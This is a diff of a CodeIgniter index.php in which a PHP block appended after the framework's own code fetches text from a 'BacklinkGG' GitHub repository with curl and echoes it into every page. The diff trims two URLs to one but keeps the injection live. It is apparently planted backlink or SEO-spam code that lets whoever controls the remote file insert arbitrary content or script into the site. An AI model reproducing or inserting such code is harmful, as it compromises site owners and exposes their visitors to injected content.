@@ -205,15 +205,10 @@ require_once BASEPATH.'core/CodeIgniter.php';
 /* Location: ./index.php */
 ?>
 <?php
-$url1 = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
-$url2 = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
-$ch = curl_init();
+$url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
+$ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_URL, $url1);
-$result1 = curl_exec($ch);
-curl_setopt($ch, CURLOPT_URL, $url2);
-$result2 = curl_exec($ch);
+$result = curl_exec($ch);
 curl_close($ch);
-echo $result1;
-echo $result2;
+echo $result;
 ?>
